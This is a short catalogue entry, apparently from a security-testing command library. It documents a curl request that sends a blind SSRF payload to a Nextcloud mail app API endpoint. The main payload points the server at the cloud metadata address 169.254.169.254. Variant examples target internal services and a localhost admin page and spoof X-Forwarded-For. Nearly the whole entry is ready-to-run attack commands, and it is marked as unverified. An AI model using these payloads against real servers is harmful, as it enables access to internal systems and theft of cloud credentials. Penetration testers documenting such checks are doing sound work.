---
data: >-
  curl -X POST 'https://nextcloud.example.com/apps/mail/api/v1/fetch' -H
  'Authorization: Basic <base64-encoded-credentials>' -H 'Content-Type:
  application/json' -d '{"url": "http://169.254.169.254/latest/meta-data/",
  "other": "valid"}'
tags:
  - ssrf
  - web
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:48.399Z'
id: ce332e7c-6b97-46d1-896f-a2caa2452872
verified: false
validated: true
submitted: true
---
# curl-send-ssrf-payload

## Command

```bash
curl -X POST 'https://nextcloud.example.com/apps/mail/api/v1/fetch' \
  -H 'Authorization: Basic <base64-encoded-credentials>' \
  -H 'Content-Type: application/json' \
  -d '{"url": "http://169.254.169.254/latest/meta-data/", "other": "valid"}'
```

## Description

This command sends a crafted POST request to Nextcloud's mail app API to trigger a blind SSRF by supplying an internal URL in the payload. Use it to test SSRF vulnerabilities where the server fetches the provided URL.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `'https://nextcloud.example.com/apps/mail/api/v1/fetch'` | Target endpoint URL | Yes |
| `-H 'Authorization: Basic <base64-encoded-credentials>'` | Authentication header with base64(user:pass) | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON content type | Yes |
| `-d '{"url": "http://169.254.169.254/latest/meta-data/", "other": "valid"}'` | JSON payload with malicious internal URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/apps/mail/api/v1/fetch' -H 'Authorization: Basic dXNlcjpwYXNz' -d '{"url": "http://internal.service"}'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/apps/mail/api/v1/fetch' -H 'Authorization: Basic <creds>' -H 'X-Forwarded-For: 127.0.0.1' -d '{"url": "http://localhost:8080/admin", "timeout": 30}'
```

## Expected Output

A JSON response like {"status": "ok"} or an error; success inferred from response timing rather than content.

## Related

- [[Related Procedure: Exploit-Blind-SSRF-in-Nextcloud-Mail-App]]
